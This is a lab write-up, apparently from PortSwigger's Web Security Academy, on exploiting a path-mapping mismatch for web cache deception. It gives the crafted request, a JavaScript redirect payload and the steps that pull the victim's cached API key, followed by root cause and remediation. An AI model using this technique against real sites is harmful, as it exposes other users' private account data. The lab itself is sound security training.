# Exploiting Path Mapping for Web Cache Deception

## Description

To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

### Required Knowledge

To solve this lab, you need to know:

- How regex-based endpoints map URL paths to resources.
- How to detect and exploit discrepancies in the way the cache and origin server map URL paths.

## Solution

### Step 1: Log in and inspect the account page

I accessed the lab and clicked on `My account`. I logged in using the given credentials `wiener:peter`. After login, I was redirected to `/my-account`, which displayed my username and API key.

I captured this request in Burp Suite and sent it to Repeater. Testing the plain `/my-account` request showed no `X-Cache` or `Cache-Control` headers in the response, which makes sense since this is a dynamic, personalized page that should never be cached.

### Step 2: Probe for path mapping discrepancies

I then tried appending a static-looking resource path after `/my-account`:

```http
GET /my-account/resources/work.png HTTP/2
Host: 0aaa00eb032775ef80a930be005800b2.web-security-academy.net
Cookie: session=lG9RK7QoRblx0fM0VHm2to3AmhGJAkjD
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aaa00eb032775ef80a930be005800b2.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

The idea behind this request is a path mapping mismatch: the cache server sees the `.png` extension in the path and assumes this is a static file, which is normally safe to cache. The back-end application, however, uses a regex-based route that treats anything after `/my-account/` as still belonging to the account page, and returns the same personalized account content regardless of what follows. This gap between how the cache and the origin server interpret the same URL is what makes the request exploitable.

### Step 3: Confirm the response is being cached

The response to this request was:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 2
X-Cache: miss
Content-Length: 3928
```

Unlike the plain `/my-account` request, this response included `Cache-Control: max-age=30` and `X-Cache: miss`, indicating the cache server stored this response for 30 seconds. Sending the same request again returned `X-Cache: hit`, confirming the personalized page, including `wiener`'s username and API key (`seiCBuEfO85SPkqyV92nLN3OeFXuq9uS`), was now being served from a shared, public cache rather than freshly generated per user.

I verified this by opening the same URL in an incognito browser and confirming that `wiener`'s cached account details, including the API key, were served without needing to log in.

### Step 4: Deliver the exploit to the victim

Since visiting this URL causes the victim's own personalized account page to be cached and subsequently served to any other visitor, I crafted a simple exploit to get the victim (`carlos`, simulated by the lab) to visit the URL themselves while authenticated:

```html
<script>
	document.location = "https://0aaa00eb032775ef80a930be005800b2.web-security-academy.net/my-account/resources/work.png";
</script>
```

Delivering this to the victim causes their browser to request the cacheable URL while their own session is active, which stores their personalized account content, including their API key, in the shared cache.

### Step 5: Retrieve the cached victim data

After allowing some time for the victim to visit the exploit, I revisited the same URL in an incognito browser (unauthenticated) and retrieved the cached response, now containing `carlos`'s data:

```text
Your username is: carlos

Your API Key is: uAUyJp8TBCJ09ZM9R9eBD2V7Mg15DMiS
```

### Step 6: Submit the API key

I submitted the retrieved API key for `carlos`, which solved the lab.

## Root Cause

The cache and the origin server disagree on how to interpret the same URL. The cache treats any path ending in a static file extension, such as `.png`, as a cacheable static resource, without knowing that the back-end application's routing is regex-based and will still route `/my-account/resources/work.png` to the same personalized account handler as `/my-account`. As a result, a genuinely dynamic, user-specific response gets cached and served to anyone who subsequently requests the same URL, leaking one user's sensitive data (their API key) to any other visitor.

## Remediation

- Ensure that back-end routing rules do not treat arbitrary suffixes or unrelated static-looking paths as equivalent to a sensitive, dynamic endpoint.
- Explicitly set `Cache-Control: no-store` (or otherwise mark as non-cacheable) any response containing personalized or sensitive data, regardless of the request path used to reach it.
- Configure the cache to make caching decisions based on the actual `Content-Type` and cache-control directives returned by the origin, rather than inferring cacheability solely from the request path's file extension.
- Avoid discrepancies between how the cache and the origin server normalize or interpret URL paths, since any such mismatch can be abused to trick one component into treating a sensitive resource as safe to cache.